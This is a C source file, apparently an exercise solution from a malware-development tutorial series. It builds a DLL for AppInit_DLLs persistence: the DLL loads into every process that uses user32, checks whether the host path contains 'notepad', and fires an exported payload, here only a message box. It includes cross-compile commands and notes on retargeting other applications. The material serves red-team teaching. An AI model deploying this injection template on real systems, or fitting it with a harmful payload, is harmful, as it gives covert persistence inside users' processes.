/*
 * exercise 5 solution
 * persistence: AppInit_DLLs payload DLL - pure C port with process guard
 * hack5.c  (compile as DLL: hack5.dll)
 * author: @cocomelonc
 *
 * base: 04-appinit-dlls/hack.cpp  (C++ DLL, MessageBox always)
 *       04-appinit-dlls/hack2.cpp (C++ DLL, only fires for "paint")
 *
 * changes vs originals:
 *   1. no extern "C"  - in C, all functions have C linkage by default.
 *                       __declspec(dllexport) is sufficient.
 *   2. process-name guard (from hack2.cpp) ported to pure C:
 *      use GetModuleFileNameA + strstr to check the loading process.
 *      fires only when "notepad" appears in the executable path.
 *   3. #pragma comment dropped - pass -luser32 on the command line.
 *
 * how AppInit_DLLs works:
 *   Windows loads every DLL listed in
 *     HKLM\...\Windows NT\...\Windows\AppInit_DLLs
 *   into every process that loads user32.dll.
 *   LoadAppInit_DLLs must be 1 (set by 04-appinit-dlls/pers.c).
 *   the DLL's DllMain is called with DLL_PROCESS_ATTACH for each
 *   such process - without the guard, EVERY GUI app triggers the payload.
 *
 * process-name guard:
 *   GetModuleFileNameA(NULL, path, MAX_PATH) fills path with the full
 *   path of the host executable.  strstr(path, "notepad") checks if
 *   "notepad" appears anywhere in that path (case-sensitive).
 *   change "notepad" to any other substring to target different apps.
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack5.c -o hack5.dll -shared \
 *   -I/usr/share/mingw-w64/include/ -s \
 *   -ffunction-sections -fdata-sections \
 *   -Wno-write-strings -fno-exceptions \
 *   -fmerge-all-constants -static-libstdc++ -static-libgcc \
 *   -luser32
 */
#include <windows.h>
#include <string.h>

/*
 * exercise 5 change 1: pure C exported function - no extern "C" needed.
 * __declspec(dllexport) marks the symbol for export in the DLL's
 * export table, making it callable from outside the DLL.
 */
__declspec(dllexport) BOOL WINAPI runMe(void) {
  MessageBoxA(NULL, "Hello from hack5.dll!", "=^..^=", MB_OK);
  return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
  char path[MAX_PATH];

  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    /*
     * exercise 5 change 2: process-name guard (ported from hack2.cpp).
     *
     * GetModuleFileNameA(NULL, ...) returns the full path of the EXE
     * that loaded this DLL.  we only trigger the payload if the path
     * contains "notepad" - prevents the MessageBox from popping up in
     * every GUI process on the system.
     *
     * original hack.cpp: no guard - fires for every process
     * hack2.cpp (C++):   strstr guard for "paint"
     * this file (C):     strstr guard for "notepad"
     */
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (strstr(path, "notepad") != NULL) {
      runMe();
    }
    break;

  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
